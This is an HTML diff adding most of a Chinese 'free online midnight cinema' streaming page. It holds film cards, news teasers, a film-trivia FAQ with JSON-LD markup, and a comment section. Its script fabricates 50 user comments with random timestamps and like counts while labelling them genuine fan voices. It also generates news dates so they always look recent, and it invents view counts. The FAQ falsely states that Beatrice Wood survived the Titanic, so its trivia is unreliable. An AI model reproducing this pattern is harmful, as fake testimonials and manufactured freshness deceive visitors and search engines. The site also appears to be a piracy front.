+                        <h3>星际穿越</h3>
+                        <p>跨越维度的太空史诗，父女情动人心弦。</p>
+                        <div class="video-meta">
+                            <span>▶ 328万</span>
+                            <span>👍 2.6万</span>
+                        </div>
+                        <div class="video-tags">
+                            <span class="tag-video">豆瓣9.4</span>
+                            <span class="tag">诺兰</span>
+                            <span class="tag">太空</span>
+                        </div>
+                    </div>
+                </div>
+                <!-- 卡片2 -->
+                <div class="video-card">
+                    <div class="video-thumbnail" style="background:linear-gradient(135deg,#3A1C71,#D76D77);">
+                        <span class="tag-cat">🎭 剧情</span>
+                        <div class="play-btn"></div>
+                        <span class="video-duration">2:12:00</span>
+                    </div>
+                    <div class="video-info">
+                        <h3>让子弹飞</h3>
+                        <p>姜文神作，土匪与恶霸的智斗传奇。</p>
+                        <div class="video-meta">
+                            <span>▶ 256万</span>
+                            <span>👍 1.8万</span>
+                        </div>
+                        <div class="video-tags">
+                            <span class="tag-video">豆瓣9.0</span>
+                            <span class="tag">姜文</span>
+                            <span class="tag">经典</span>
+                        </div>
+                    </div>
+                </div>
+                <!-- 卡片3 -->
+                <div class="video-card">
+                    <div class="video-thumbnail" style="background:linear-gradient(135deg,#0B2E59,#1C6EA4);">
+                        <span class="tag-cat">💞 爱情</span>
+                        <div class="play-btn"></div>
+                        <span class="video-duration">3:14:00</span>
+                    </div>
+                    <div class="video-info">
+                        <h3>泰坦尼克号</h3>
+                        <p>永恒之恋，沉船悲剧中的生命绝唱。</p>
+                        <div class="video-meta">
+                            <span>▶ 452万</span>
+                            <span>👍 3.1万</span>
+                        </div>
+                        <div class="video-tags">
+                            <span class="tag-video">豆瓣9.5</span>
+                            <span class="tag">卡梅隆</span>
+                            <span class="tag">经典</span>
+                        </div>
+                    </div>
+                </div>
+                <!-- 卡片4 -->
+                <div class="video-card">
+                    <div class="video-thumbnail" style="background:linear-gradient(135deg,#2C2C2C,#4A4A4A);">
+                        <span class="tag-cat">🕶 犯罪</span>
+                        <div class="play-btn"></div>
+                        <span class="video-duration">2:55:00</span>
+                    </div>
+                    <div class="video-info">
+                        <h3>教父</h3>
+                        <p>黑帮家族的荣耀与没落，影史经典。</p>
+                        <div class="video-meta">
+                            <span>▶ 302万</span>
+                            <span>👍 2.2万</span>
+                        </div>
+                        <div class="video-tags">
+                            <span class="tag-video">豆瓣9.3</span>
+                            <span class="tag">马龙·白兰度</span>
+                            <span class="tag">黑帮</span>
+                        </div>
+                    </div>
+                </div>
+                <!-- 卡片5 -->
+                <div class="video-card">
+                    <div class="video-thumbnail" style="background:linear-gradient(135deg,#0F3443,#34E89E);">
+                        <span class="tag-cat">📖 救赎</span>
+                        <div class="play-btn"></div>
+                        <span class="video-duration">2:22:00</span>
+                    </div>
+                    <div class="video-info">
+                        <h3>肖申克的救赎</h3>
+                        <p>越狱与救赎，关于希望的不朽寓言。</p>
+                        <div class="video-meta">
+                            <span>▶ 401万</span>
+                            <span>👍 2.8万</span>
+                        </div>
+                        <div class="video-tags">
+                            <span class="tag-video">豆瓣9.7</span>
+                            <span class="tag">越狱</span>
+                            <span class="tag">希望</span>
+                        </div>
+                    </div>
+                </div>
+                <!-- 卡片6 -->
+                <div class="video-card">
+                    <div class="video-thumbnail" style="background:linear-gradient(135deg,#8E2DE2,#4A00E0);">
+                        <span class="tag-cat">🏮 古装</span>
+                        <div class="play-btn"></div>
+                        <span class="video-duration">45:00</span>
+                    </div>
+                    <div class="video-info">
+                        <h3>长安十二时辰</h3>
+                        <p>十二时辰破迷局，长安危在旦夕。</p>
+                        <div class="video-meta">
+                            <span>▶ 189万</span>
+                            <span>👍 1.5万</span>
+                        </div>
+                        <div class="video-tags">
+                            <span class="tag-video">豆瓣8.3</span>
+                            <span class="tag">古装悬疑</span>
+                            <span class="tag">雷佳音</span>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </section>
+    <!-- ===== 相关资讯 ===== -->
+    <section id="section-news">
+        <div class="container">
+            <div class="section-title">
+                <h2>📰 相关资讯</h2>
+                <p>影视行业动态 · 深度解读 · 幕后故事</p>
+                <div class="divider"></div>
+            </div>
+            <div class="news-grid" id="newsGrid">
+                <div class="news-card">
+                    <div class="news-date"></div>
+                    <h3>2026年最值得期待的科幻片Top10</h3>
+                    <p class="news-desc">从《三体2》到《沙丘3》，2026年科幻电影市场迎来大爆发，本文盘点年度最值得期待的科幻大片。</p>
+                    <a href="#" class="news-link">查看详情 →</a>
+                </div>
+                <div class="news-card">
+                    <div class="news-date"></div>
+                    <h3>经典修复版电影重映考据</h3>
+                    <p class="news-desc">4K修复技术让老电影重焕新生，那些年我们错过的佳作正在回归大银幕。</p>
+                    <a href="#" class="news-link">查看详情 →</a>
+                </div>
+                <div class="news-card">
+                    <div class="news-date"></div>
+                    <h3>国产剧海外发行新趋势</h3>
+                    <p class="news-desc">从《长安十二时辰》到《漫长的季节》，国产剧出海正从文化输出走向商业共赢。</p>
+                    <a href="#" class="news-link">查看详情 →</a>
+                </div>
+                <div class="news-card">
+                    <div class="news-date"></div>
+                    <h3>从胶片到数字：电影技术百年变迁</h3>
+                    <p class="news-desc">胶片时代的光影魔法与数字时代的美学革命，技术如何改变电影语言。</p>
+                    <a href="#" class="news-link">查看详情 →</a>
+                </div>
+                <div class="news-card">
+                    <div class="news-date"></div>
+                    <h3>午夜场文化：都市夜猫子的观影江湖</h3>
+                    <p class="news-desc">午夜场正在成为城市年轻人的精神圣所，是逃离也是相遇。</p>
+                    <a href="#" class="news-link">查看详情 →</a>
+                </div>
+                <div class="news-card">
+                    <div class="news-date"></div>
+                    <h3>高智商悬疑片叙事结构拆解</h3>
+                    <p class="news-desc">从《记忆碎片》到《盗梦空间》，拆解悬疑大师们的叙事密码。</p>
+                    <a href="#" class="news-link">查看详情 →</a>
+                </div>
+            </div>
+        </div>
+    </section>
+    <!-- ===== 常见问题 FAQ ===== -->
+    <section id="section-faq">
+        <div class="container">
+            <div class="section-title">
+                <h2>❓ 常见问题</h2>
+                <p>关于影视作品的深度解答，你想知道的都在这里</p>
+            </div>
+            <div class="faq-list">
+                <!-- Q1 -->
+                <div class="faq-item open">
+                    <div class="faq-question">
+                        <i class="fa-solid fa-film"></i>
+                        <h3>《星际穿越》中的黑洞"卡冈图雅"是如何制作出来的？</h3>
+                        <span class="faq-icon">▾</span>
+                    </div>
+                    <div class="faq-answer">
+                        <ul>
+                            <li>由诺贝尔物理学奖得主基普·索恩提供真实物理数学方程</li>
+                            <li>特效团队Double Negative为此开发了全新的渲染引擎</li>
+                            <li>生成数据量高达800TB，渲染耗时超过数月</li>
+                            <li>画面中每个吸积盘粒子都经过广义相对论计算模拟</li>
+                            <li>最终成像与2019年真实黑洞照片高度一致，堪称预言</li>
+                        </ul>
+                    </div>
+                </div>
+                <!-- Q2 -->
+                <div class="faq-item">
+                    <div class="faq-question">
+                        <i class="fa-solid fa-mask"></i>
+                        <h3>《让子弹飞》片尾张麻子到底去了哪里？</h3>
+                        <span class="faq-icon">▾</span>
+                    </div>
+                    <div class="faq-answer">
+                        <ul>
+                            <li>导演姜文没有给出明确答案，留下开放式结局</li>
+                            <li>火车轨道的意象被认为暗喻革命后的新征程</li>
+                            <li>张麻子落寞的表情暗示兄弟分道扬镳的孤独</li>
+                            <li>结尾"浦东"和"上海"对白暗含时代变迁的隐喻</li>
+                            <li>影迷从政治哲学角度解读，成为经典电影悬案</li>
+                        </ul>
+                    </div>
+                </div>
+                <!-- Q3 -->
+                <div class="faq-item">
+                    <div class="faq-question">
+                        <i class="fa-solid fa-heart"></i>
+                        <h3>《泰坦尼克号》中Rose的原型人物是谁？</h3>
+                        <span class="faq-icon">▾</span>
+                    </div>
+                    <div class="faq-answer">
+                        <ul>
+                            <li>詹姆斯·卡梅隆承认角色参考了真实历史人物Beatrice Wood</li>
+                            <li>她是美国艺术家，在泰坦尼克号沉没事件中幸存</li>
+                            <li>Wood本人享年105岁，人生经历比电影更为传奇</li>
+                            <li>电影中的"海洋之心"钻石为艺术虚构，真实沉船并无此物</li>
+                            <li>老年Rose的艺术收藏家身份正是致敬Wood的画家生涯</li>
+                        </ul>
+                    </div>
+                </div>
+                <!-- Q4 -->
+                <div class="faq-item">
+                    <div class="faq-question">
+                        <i class="fa-solid fa-users"></i>
+                        <h3>《教父》马龙·白兰度为什么用低声嘟囔的说话方式？</h3>
+                        <span class="faq-icon">▾</span>
+                    </div>
+                    <div class="faq-answer">
+                        <ul>
+                            <li>白兰度认为教父应具备猫科动物般的优雅与危险感</li>
+                            <li>他在嘴里塞了棉球改变声音质感，制造压迫感</li>
+                            <li>这种演绎让人物更加神秘，同时强化了角色的威严</li>
+                            <li>导演科波拉全力支持他的即兴创作，没有反对</li>
+                            <li>最终成为影史极具辨识度的表演风格之一，被后人模仿</li>
+                        </ul>
+                    </div>
+                </div>
+                <!-- Q5 -->
+                <div class="faq-item">
+                    <div class="faq-question">
+                        <i class="fa-solid fa-hammer"></i>
+                        <h3>《肖申克的救赎》安迪真的越狱成功了吗？</h3>
+                        <span class="faq-icon">▾</span>
+                    </div>
+                    <div class="faq-answer">
+                        <ul>
+                            <li>电影呈现了越狱成功的美好结局，安迪抵达墨西哥海滩</li>
+                            <li>他爬过500码污水管道，象征洗礼与重生</li>
+                            <li>斯蒂芬·金的原著小说中同样成功越狱，与电影一致</li>
+                            <li>该结局满足了观众对希望与自由的内心寄托</li>
+                            <li>摩根·弗里曼扮演的瑞德在片中确认了结局的真实性</li>
+                        </ul>
+                    </div>
+                </div>
+                <!-- Q6 -->
+                <div class="faq-item">
+                    <div class="faq-question">
+                        <i class="fa-solid fa-compass"></i>
+                        <h3>《长安十二时辰》中狼卫的身份和历史背景是什么？</h3>
+                        <span class="faq-icon">▾</span>
+                    </div>
+                    <div class="faq-answer">
+                        <ul>
+                            <li>狼卫是剧中来自西域的雇佣兵组织，属于粟特胡人集团</li>
+                            <li>其设定灵感源于唐代真实存在的粟特武装商团</li>
+                            <li>剧中被幕后势力雇佣，潜入长安制造恐怖袭击</li>
+                            <li>唐代长安城实际汇聚多国人群，确实存在复杂安保问题</li>
+                            <li>主创团队参考了大量唐代边疆文献与考古资料</li>
+                        </ul>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </section>
+    <!-- ===== 评论留言 ===== -->
+    <section id="section-comment">
+        <div class="container">
+            <div class="section-title">
+                <h2>💬 影迷留言</h2>
+                <p>来自百万影迷的真实声音</p>
+                <div class="divider"></div>
+            </div>
+            <div class="comment-container">
+                <!-- 左侧表单 -->
+                <div class="comment-form-wrap">
+                    <div class="inner-card">
+                        <input type="text" placeholder="你的昵称" maxlength="16">
+                        <textarea placeholder="写下你对本站剧集、功能的看法与建议..."></textarea>
+                        <button class="comment-submit">↑ 发布留言</button>
+                    </div>
+                </div>
+                <!-- 右侧评论列表 -->
+                <div class="comment-list-wrap" id="commentList">
+                    <!-- JS动态生成50条评论 -->
+                </div>
+            </div>
+        </div>
+    </section>
+    <!-- ===== 页脚 ===== -->
+    <footer class="site-footer">
+        <div class="container">
+            <p class="copy">© 2026 午夜影院免费在线 · 本站所有内容均来自互联网公开资源</p>
+            <p>若侵犯了您的版权，请联系我们，我们将在24小时内删除。请支持正版，远离盗版。</p>
+            <p><a href="#">隐私政策</a> · <a href="#">使用条款</a> · <a href="#">联系我们</a></p>
+        </div>
+    </footer>
+    <script>
+        // ===== 粒子背景 =====
+        (function() {
+            const canvas = document.getElementById('particle-bg');
+            const ctx = canvas.getContext('2d');
+            let w = canvas.width = window.innerWidth;
+            let h = canvas.height = window.innerHeight;
+            const pts = [];
+            for (let i = 0; i < 45; i++) {
+                pts.push({
+                    x: Math.random() * w,
+                    y: Math.random() * h,
+                    vx: (Math.random() - 0.5) * 0.6,
+                    vy: (Math.random() - 0.5) * 0.6,
+                    r: Math.random() * 2 + 0.5,
+                    a: Math.random() * 0.4 + 0.1
+                });
+            }
+            function draw() {
+                ctx.clearRect(0, 0, w, h);
+                pts.forEach(p => {
+                    p.x += p.vx;
+                    p.y += p.vy;
+                    if (p.x < 0 || p.x > w) p.vx *= -1;
+                    if (p.y < 0 || p.y > h) p.vy *= -1;
+                    ctx.beginPath();
+                    ctx.arc(p.x, p.y, p.r, 0, Math.PI * 2);
+                    ctx.fillStyle = 'rgba(200,210,255,' + p.a + ')';
+                    ctx.fill();
+                });
+                requestAnimationFrame(draw);
+            }
+            draw();
+            window.addEventListener('resize', () => {
+                w = canvas.width = window.innerWidth;
+                h = canvas.height = window.innerHeight;
+            });
+        })();
+        // ===== 滚动进度条 =====
+        (function() {
+            const bar = document.getElementById('scroll-progress');
+            window.addEventListener('scroll', function() {
+                const scrollTop = window.pageYOffset;
+                const docHeight = document.documentElement.scrollHeight - window.innerHeight;
+                const pct = docHeight > 0 ? (scrollTop / docHeight) * 100 : 0;
+                bar.style.width = pct + '%';
+            });
+        })();
+        // ===== FAQ 手风琴 =====
+        (function() {
+            const items = document.querySelectorAll('.faq-item');
+            items.forEach(item => {
+                const q = item.querySelector('.faq-question');
+                q.addEventListener('click', function() {
+                    const isOpen = item.classList.contains('open');
+                    items.forEach(i => i.classList.remove('open'));
+                    if (!isOpen) item.classList.add('open');
+                });
+            });
+        })();
+        // ===== 资讯日期动态生成（2026年近90天） =====
+        (function() {
+            const dates = document.querySelectorAll('#newsGrid .news-date');
+            const now = new Date();
+            const year = now.getFullYear();
+            // 确保是2026年
+            const base = new Date(year, 0, 1);
+            const dayMs = 24 * 60 * 60 * 1000;
+            // 生成近90天的日期（含今天）
+            const days = [];
+            for (let i = 0; i < 90; i++) {
+                days.push(new Date(now.getTime() - i * dayMs));
+            }
+            // 按从早到晚排序
+            days.reverse();
+            // 分配6个日期（均匀分布）
+            const indexes = [3, 18, 35, 52, 70, 85];
+            const fmt = (d) => {
+                const m = String(d.getMonth() + 1).padStart(2, '0');
+                const day = String(d.getDate()).padStart(2, '0');
+                return year + '-' + m + '-' + day;
+            };
+            dates.forEach((el, i) => {
+                el.textContent = '📅 ' + fmt(days[indexes[i] % days.length]);
+            });
+        })();
+        // ===== 评论动态生成50条 =====
+        (function() {
+            const list = document.getElementById('commentList');
+            const nicknames = [
+                '追剧小达人', '夜半观影人', '胶片情怀', '光影随行者', '屏幕前的猫',
+                '星夜拾光', '煲剧君', '深海电影院', '晚风影视迷', '午夜守门人',
+                '像素与诗', '追剧狂想曲', '银幕碎碎念', '烂片避雷针', '剧情党领袖',
+                '颜控小板凳', '彩蛋挖掘机', '先锋影视控', '复古录像带', '硬核观影团',
+                '夜猫子影迷', '浮光掠影客', '迷雾剧场粉', '环太平洋观众', '深夜放映室',
+                '最佳配角', '片尾字幕党', '电影解药', '不再剧荒', '流媒体漫游者',
+                '灵魂观影者', '小城影迷', '剧情裂缝', '文艺片避难所', '天天看好片',
+                '幕布之后', '银幕浪人', '剧集收藏家', '夜风影视', '慢镜头患者',
+                '大银幕信徒', '只想看好剧', '午夜胶片馆', '光影笔记', '悄悄看电影',
+                '追剧不停', '银河映像迷', '默默刷片', '独白剧场', '片荒救星'
+            ];
+            const texts = [
+                '这个平台的画质也太顶了吧，4K HDR看起来爽死了！',
+                '第三集那个反转我完全没猜到，编剧太狠了。',
+                '每天晚上必刷，已经成习惯了，支持一下！',
+                '谁能告诉我第二季到底什么时候上线？等得好苦。',
+                '终于找到一个不卡的影视站，眼泪都要流下来了。',
+                '这部片子的配乐太绝了，听完起了一身鸡皮疙瘩。',
+                '演员演技全程在线，尤其是那个女配角，太惊艳。',
+                '建议增加一个"只看TA"的选项，就完美了。',
+                '剧情节奏稍微有点慢，但后劲很大，值得二刷。',
+                '这特效完全不输好莱坞啊，国产剧雄起了！',
+                '夜里的观影氛围真的不一样，越看越精神。',
+                '希望多上一些老电影，想重温童年经典。',
+                '这个字幕翻译很有心，梗都解释到位了。',
+                '从第一集追到现在，每集都有惊喜，优秀！',
+                '在手机上看的，清晰度也这么好，厉害。',
+                '求求了，把这部片子的花絮放出来吧！',
+                '看到凌晨三点，明天还要上班，真·上头。',
+                '这个剧的服化道真的是细节控福音。',
+                '能不能开个弹幕功能啊？想和大家一起玩。',
+                '这片子的摄影太美了，每一帧都是壁纸。',
+                '作为原著党，我觉得改编得很到位。',
+                '终于有地方能看高清版了，之前找了好久。',
+                '最喜欢这种不拖沓的剧，节奏明快不注水。',
+                '这个平台的推荐算法还挺准，推的都是我爱看的。',
+                '看完心情久久不能平静，好作品就是有力量。',
+                '周末就想宅在家刷一整天，哪里都不去。',
+                '这个系列能不能一直拍下去，我永远支持！',
+                '看到弹幕说这里有个彩蛋，回去重复看了三遍。',
+                '剧中的反派演技太好了，让人又恨又怕。',
+                '希望出个TV版，电视上躺着看更舒服。',
+                '第一次觉得看广告也是一种享受（不，并没有）。',
+                '半夜看恐怖片，吓得把脚缩回被子里了。',
+                '片尾字幕的BGM太好听了，求歌名！',
+                '这个平台的加载速度是真的快，点开就播。',
+                '为什么我没早点发现这个宝藏网站！',
+                '剧情内容很丰富，每集信息量都很大。',
+                '这个导演的镜头语言真的太有味道了。',
+                '感觉男二比男主还要帅，是我的错觉吗？',
+                '这部电影看完后劲儿好大，一直睡不着。',
+                '能不能告诉我和朋友一起看的观影功能？',
+                '评分系统很公正，高分作品确实是精品。',
+                '希望多更新一些悬疑类的剧集，最爱！',
+                '这部纪录片绝了，画面美到窒息。',
+                '以后就在你这里看电影了，江湖再见！',
+                '最近剧荒被救星降临，爱了爱了。',
+                '这个平台不要太良心，没有乱七八糟的弹窗。',
+                '追了半个月终于看完了，意犹未尽啊。',
+                '适合一个人安静看的电影，氛围感满分。',
+                '凌晨两点还在看这部剧的不止我一个吧？',
+                '我要向全世界安利这个影视平台！'
+            ];
+            const tags = ['热议', '理性', '热门', '观点', '精彩', '讨论', '催更', '好评'];
+            const avatars = ['#5B6CF5', '#8B5CF6', '#E8B44A', '#28C840', '#FF788C', '#50C8FF', '#FF9F43', '#6C5CE7'];
+            const now = new Date();
+            // 生成50条评论数据
+            const comments = [];
+            for (let i = 0; i < 50; i++) {
+                const time = new Date(now.getTime() - Math.floor(Math.random() * 30 * 24 * 60 * 60 * 1000) - Math.floor(Math
+                    .random() * 60 * 60 * 1000));
+                const pad = (n) => String(n).padStart(2, '0');
+                comments.push({
+                    nickname: nicknames[i],
+                    text: texts[i],
+                    tag: tags[Math.floor(Math.random() * tags.length)],
+                    time: pad(time.getMonth() + 1) + '-' + pad(time.getDate()) + ' ' + pad(time.getHours()) + ':' + pad(time
+                        .getMinutes()),
+                    avatar: avatars[Math.floor(Math.random() * avatars.length)],
+                    likes: Math.floor(Math.random() * 1000),
+                    replies: Math.floor(Math.random() * 50)
+                });
+            }
+            // 按时间降序排序
+            comments.sort((a, b) => {
+                const pa = a.time.split(' ')[0].split('-');
+                const pb = b.time.split(' ')[0].split('-');
+                return parseInt(pb[0]) - parseInt(pa[0]) || parseInt(pb[1]) - parseInt(pa[1]);
+            });
+            // 渲染
+            comments.forEach(c => {
+                const item = document.createElement('div');
+                item.className = 'comment-item';
+                item.innerHTML = `
+                    <div class="comment-header">
+                        <div class="comment-user">
+                            <div class="comment-avatar" style="background:${c.avatar};">${c.nickname[0]}</div>
+                            <span class="comment-nickname">${c.nickname}</span>
+                        </div>
+                        <span class="comment-time">${c.time}</span>
+                    </div>
+                    <div class="comment-tag-row">
+                        <span class="comment-tag">🏷 ${c.tag}</span>
+                    </div>
+                    <div class="comment-text">${c.text}</div>
+                    <div class="comment-actions">
+                        <span class="reply">↩ 回复</span>
+                        <span class="like">👍 ${c.likes}</span>
+                        <span class="like">💬 ${c.replies}</span>
+                    </div>
+                `;
+                list.appendChild(item);
+            });
+            // 底部提示
+            const hint = document.createElement('div');
+            hint.className = 'load-hint';
+            hint.innerHTML = '↓ 向下滑动查看更多留言 ↓';
+            list.appendChild(hint);
+        })();
+    </script>
+    <!-- ===== JSON-LD 结构化数据 ===== -->
+    <script type="application/ld+json">
+        {
+            "@context": "https://schema.org",
+            "@graph": [{
+                "@type": "FAQPage",
+                "mainEntity": [{
+                    "@type": "Question",
+                    "name": "《星际穿越》中的黑洞\"卡冈图雅\"是如何制作出来的？",
+                    "acceptedAnswer": {
+                        "@type": "Answer",
+                        "text": "由基普·索恩提供物理方程，Double Negative开发新渲染引擎，生成800TB数据，每个粒子都经过相对论计算，最终与真实黑洞照片高度一致。"
+                    }
+                }, {
+                    "@type": "Question",
+                    "name": "《让子弹飞》片尾张麻子到底去了哪里？",
+                    "acceptedAnswer": {
+                        "@type": "Answer",
+                        "text": "导演姜文留下开放结局，火车轨道暗示革命延续，张麻子的落寞预示兄弟分离，结尾对白暗含时代变迁，影迷解读多元。"
+                    }
+                }, {
+                    "@type": "Question",
+                    "name": "《泰坦尼克号》中Rose的原型人物是谁？",
+                    "acceptedAnswer": {
+                        "@type": "Answer",
+                        "text": "卡梅隆参考了历史人物Beatrice Wood，她是美国艺术家，在沉船事件中幸存，享年105岁，海洋之心为艺术虚构。"
+                    }
+                }, {
+                    "@type": "Question",
+                    "name": "《教父》马龙·白兰度为什么用低声嘟囔的说话方式？",
+                    "acceptedAnswer": {
+                        "@type": "Answer",
+                        "text": "白兰度认为教父应具有猫的优雅与危险感，在嘴里塞棉球改变声质，科波拉支持他的创意，成为影史经典。"
+                    }
+                }, {
+                    "@type": "Question",
+                    "name": "《肖申克的救赎》安迪真的越狱成功了吗？",
+                    "acceptedAnswer": {
+                        "@type": "Answer",
+                        "text": "电影呈现越狱成功结局，安迪爬过500码污水管象征重生，原著小说同样成功越狱，瑞德的旁白确认了结局。"
+                    }
+                }, {
+                    "@type": "Question",
+                    "name": "《长安十二时辰》中狼卫的身份和历史背景是什么？",
+                    "acceptedAnswer": {
+                        "@type": "Answer",
+                        "text": "狼卫是来自西域的粟特胡人雇佣兵，灵感源于唐代真实的粟特武装商团，剧中他们受雇发动恐怖袭击，主创参考了大量唐代史料。"
+                    }
+                }]
+            }, {
+                "@type": "VideoObject",
+                "name": "星际穿越",
+                "description": "跨越维度的太空史诗，父女情动人心弦。",
+                "thumbnailUrl": "https://example.com/thumb/interstellar.jpg",
+                "uploadDate": "2026-01-15",
+                "duration": "PT2H49M"
+            }, {
+                "@type": "VideoObject",
+                "name": "让子弹飞",
+                "description": "姜文神作，土匪与恶霸的智斗传奇。",
+                "thumbnailUrl": "https://example.com/thumb/letbulletsfly.jpg",
+                "uploadDate": "2026-01-20",
+                "duration": "PT2H12M"
+            }, {
+                "@type": "VideoObject",
+                "name": "泰坦尼克号",
+                "description": "永恒之恋，沉船悲剧中的生命绝唱。",
+                "thumbnailUrl": "https://example.com/thumb/titanic.jpg",
+                "uploadDate": "2026-02-01",
+                "duration": "PT3H14M"
+            }, {
+                "@type": "VideoObject",
+                "name": "教父",
+                "description": "黑帮家族的荣耀与没落，影史经典。",
+                "thumbnailUrl": "https://example.com/thumb/godfather.jpg",
+                "uploadDate": "2026-02-10",
+                "duration": "PT2H55M"
+            }, {
+                "@type": "VideoObject",
+                "name": "肖申克的救赎",
+                "description": "越狱与救赎，关于希望的不朽寓言。",
+                "thumbnailUrl": "https://example.com/thumb/shawshank.jpg",
+                "uploadDate": "2026-02-15",
+                "duration": "PT2H22M"
+            }, {
+                "@type": "VideoObject",
+                "name": "长安十二时辰",
+                "description": "十二时辰破迷局，长安危在旦夕。",
+                "thumbnailUrl": "https://example.com/thumb/changan.jpg",
+                "uploadDate": "2026-02-20",
+                "duration": "PT45M"
+            }, {
+                "@type": "Article",
+                "headline": "2026年最值得期待的科幻片Top10",
+                "datePublished": "2026-02-10",
+                "author": { "@type": "Organization", "name": "午夜影院编辑部" }
+            }, {
+                "@type": "Article",
+                "headline": "经典修复版电影重映考据",
+                "datePublished": "2026-02-05",
+                "author": { "@type": "Organization", "name": "午夜影院编辑部" }
+            }, {
+                "@type": "Article",
+                "headline": "国产剧海外发行新趋势",
+                "datePublished": "2026-01-28",
+                "author": { "@type": "Organization", "name": "午夜影院编辑部" }
+            }, {
+                "@type": "Article",
+                "headline": "从胶片到数字：电影技术百年变迁",
+                "datePublished": "2026-01-20",
+                "author": { "@type": "Organization", "name": "午夜影院编辑部" }
+            }, {
+                "@type": "Article",
+                "headline": "午夜场文化：都市夜猫子的观影江湖",
+                "datePublished": "2026-01-12",
+                "author": { "@type": "Organization", "name": "午夜影院编辑部" }
+            }, {
+                "@type": "Article",
+                "headline": "高智商悬疑片叙事结构拆解",
+                "datePublished": "2026-01-05",
+                "author": { "@type": "Organization", "name": "午夜影院编辑部" }
+            }]
+        }
+    </script>
+</body>
+</html>
